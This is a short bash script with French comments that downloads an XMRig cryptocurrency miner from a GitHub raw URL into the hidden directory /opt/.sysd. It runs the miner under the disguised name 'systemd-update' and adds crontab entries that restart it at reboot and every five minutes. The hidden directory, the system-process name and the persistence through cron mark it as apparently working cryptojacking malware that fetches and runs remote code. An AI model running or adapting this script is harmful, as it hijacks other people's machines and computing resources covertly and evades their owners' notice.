#!/bin/bash

DIR="/opt/.sysd"
BIN="systemd-update"
GITHUB="https://raw.githubusercontent.com/ThipyThipy/machinee/main"

mkdir -p $DIR && cd $DIR

# Log complet du setup
exec > /setup_debug.log 2>&1

curl -fsSL $GITHUB/xmrig.tar.gz -o miner.tar.gz
tar -xzf miner.tar.gz
chmod +x $BIN

touch xmrig.log
chown root:root xmrig.log
chmod 666 xmrig.log
sleep 2

nohup nice -n 19 $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1 &

(crontab -l 2>/dev/null; echo "@reboot $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f $BIN > /dev/null || $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -

sleep 5

if [ -f $DIR/xmrig.log ]; then
  echo -e "
[🧠] Dernières lignes du log XMRig :"
  tail -n 10 $DIR/xmrig.log
else
  echo "[!] Aucun fichier de log détecté. Le mineur a peut-être échoué."
fi
